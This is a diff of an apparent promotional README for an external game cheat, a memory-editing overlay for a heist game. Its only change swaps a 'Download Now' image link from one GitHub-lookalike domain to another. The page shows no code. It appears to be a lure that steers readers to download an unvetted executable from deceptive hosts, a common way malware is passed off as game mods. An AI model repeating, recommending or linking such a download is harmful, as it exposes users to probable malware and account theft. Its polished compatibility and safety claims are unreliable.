@@ -6,7 +6,7 @@ We are a small indie development team specializing in external utilities for act
 
 This v1.2 build is compatible with the current Steam/Epic/Xbox PC client following the March 4, 2026 v1.0.1 hotfix, which corrected laser synchronization issues, refined guard patrol logic, patched minor artifact grab desyncs, and improved performance in dense museum interiors post-February 10, 2026 launch. We have confirmed stability across the full roster of 70+ artifact heists, from high-security vaults to sprawling collector estates.
 
-<a href="https://rell.githubcompiller.com/" target="_blank" rel="noopener"><img src="https://t4.ftcdn.net/jpg/08/17/73/81/360_F_817738146_X3Ze6FERyH1vZhPZmv8oOPoRVwucVVKR.jpg" alt="Download Now"></a>
+<a href="https://rell.gitget.cc/" target="_blank" rel="noopener"><img src="https://t4.ftcdn.net/jpg/08/17/73/81/360_F_817738146_X3Ze6FERyH1vZhPZmv8oOPoRVwucVVKR.jpg" alt="Download Now"></a>
 
 Our solution is entirely external: it attaches to the game process for memory reads/writes using signature scanning and pointer chains, with no DLL injection, file modifications, or runtime hooks. The Dear ImGui overlay maintains a minimal footprint (<9 MB RAM, <1% CPU idle), rendering controls cleanly over the vibrant 2.5D Africanfuturist art style without FPS impact or visual interference.
 
